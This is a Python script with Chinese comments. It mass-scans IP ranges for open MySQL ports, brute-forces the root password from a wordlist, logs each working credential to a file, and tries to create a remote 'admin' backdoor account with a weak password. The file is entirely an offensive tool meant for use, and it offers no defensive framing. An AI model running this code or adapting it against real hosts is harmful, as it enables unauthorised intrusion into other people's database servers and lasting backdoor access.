import pymysql
import socket
import time
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool

class MySQL(object):

    def __init__(self):
        self.save_path = "./result.txt"
        self.ip_list = []

    def port_scan(self, ip):
        t1 = datetime.now()
        print("[+] Testing ports of : " + str(ip) + "\n")
        # scan_port(line.strip())
        url1 = ip
        # 测试mysql端口是否开放
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(1)
        try:
            res = sk.connect_ex((ip, 3306))
            if res == 0:
                print("\n[+] " + str(url1) + "\'s Mysql is ok! try to login...\r\n")
                self.try_login_sqlserver(url1)

        except Exception as e:
            print("\n[-] " + str(url1) + "\'s Mysql is bad! " + e + "\r\n")
        sk.close()
        return

    # 尝试登陆mysql服务
    def try_login_sqlserver(self, ip):

        with open('dict.txt', 'r') as f:
            for line in f.readlines():
                print("[+] Testing ip: " + str(ip) + " & testing password：" + line.strip())

                # information_schema 是 Mysql 的默认数据库，我们有权限操作
                # PyMysql.cursors.DictCursor 以字典方式进行连接参数管理
                try:
                    connection = pymysql.connect(host=ip,
                                                 user='root',
                                                 password=line.strip(),
                                                 db='information_schema',
                                                 charset='utf8mb4',
                                                 cursorclass=pymysql.cursors.DictCursor)

                    print("\n[+] Testing ip: " + str(ip) + " Login successfully! try to set a backdoor account...\r\n")
                    result_list = "\nsql service -- " + str(time.asctime()) + " ip: " + str(ip) + " pwd : " + \
                                  str(line.strip())
                    self.save_result(result_list)
                    # 后门账号密码为 admin 123456
                    self.try_set_backdoor(connection)
                    connection.close()
                except Exception as e:
                    # print "[-] " + str(e.message)
                    print("\n[+] Testing ip: " + str(ip) + "  Using weakly password login failed!..." + str(e) + "\r\n")
                pass
        return

    def try_set_backdoor(self, connection):
        try:
            with connection.cursor() as cursor:
                # 创建一个新用户
                sql = "CREATE user 'admin'@'%' identified by '123456';"
                cursor.execute(sql)
                # 将后门用户权限给到最大
                cursor.execute("flush privileges;")
                connection.commit()
                connection.close()

                print("[+] New account set successfully!\r\n")
        except Exception as e:
            # print e
            print("[-] New account set failed! " + str(e) + '\r\n')
        return

    def save_result(self, result_list):
        s = open(self.save_path, "a")
        s.write(result_list)
        s.close()
        return

    def threadpool(self):
        with open('iprange.txt', 'rb') as f:
            for line in f.readlines():
                self.ip_list.append(line.strip())
        print(self.ip_list)
        t1 = datetime.now()
        # 线程数为20
        pool = ThreadPool(processes=20)
        try:
            pool.map(self.port_scan, self.ip_list)
        except Exception as e:
            print(e)
        pool.close()
        pool.join()

        print('Multiprocess Scanning Completed in  ', datetime.now() - t1)
        # port_scan(save_path="./result.txt")
        return
